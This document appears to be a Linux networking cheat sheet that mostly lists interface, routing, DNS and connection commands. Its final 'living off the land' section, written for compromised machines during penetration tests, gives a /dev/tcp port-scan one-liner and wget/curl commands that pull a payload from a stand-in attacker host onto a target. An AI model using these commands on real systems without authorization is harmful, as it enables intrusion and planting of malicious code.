Linux Networking Operations

Mastering network reconnaissance and configuration directly from the command line is foundational for any system administrator or security professional. Linux offers highly robust utilities to inspect interfaces, monitor traffic, and troubleshoot connections natively.

Interface Configuration & Status

BASH 
# Show IP addresses and network interfaces (Modern method)
$ ip a  
# Or:  ip addr show

# Show IP addresses (Legacy method, deprecated but common)
$ ifconfig

# Show the routing table (How traffic finds its way out to the internet)
$ ip route
# Check specifically for the Default Gateway:
$ ip route | grep default

# Bring a network interface up or down
$ sudo ip link set eth0 up
$ sudo ip link set eth0 down

Connection Troubleshooting

BASH 
# Check if a host is alive (Uses ICMP Echo Requests)
$ ping 8.8.8.8

# See the exact path your packets take to reach a target
$ traceroute google.com
# Use 'mtr' for a real-time, dynamic traceroute (Highly recommended!)
$ mtr google.com

# Perform DNS lookups (Translate domain names to IPs)
$ dig targetdomain.com
$ nslookup targetdomain.com

# Show active network connections, ports listening, and the PIDs associated
# Note: 'netstat' is legacy, 'ss' is modern and faster.
$ ss -tulnp
$ netstat -tunlp

Security Tricks (Living off the land)

During a penetration test where you do not have Nmap or Wireshark installed on the compromised machine, you can use built-in tools to extract network information:

  • Finding local neighbors: You can view the ARP cache to see other machines on the same local subnet using arp -a or ip neigh.
  • Poor man's port scan: Using `/dev/tcp`: timeout 1 bash -c 'cat < /dev/null > /dev/tcp/10.10.10.1/80' && echo "Port Open"
  • Downloading payloads: Use wget http://attacker/payload.sh or curl -O http://attacker/payload.sh to pull data onto a target over HTTP.
